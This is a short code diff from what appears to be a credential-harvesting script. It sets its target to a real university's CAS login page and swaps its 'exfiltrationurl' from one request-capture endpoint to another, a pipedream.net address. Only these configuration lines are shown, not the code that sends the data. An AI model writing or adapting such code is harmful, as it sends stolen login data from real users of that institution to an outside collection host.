@@ -1,5 +1,5 @@
 targeturl = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
-exfiltrationurl = 'https://requestbin.io/v06r31v0';
+exfiltrationurl = 'https://enpaa5q70essb.x.pipedream.net';
 
 objtarget = new URL(targeturl);
 
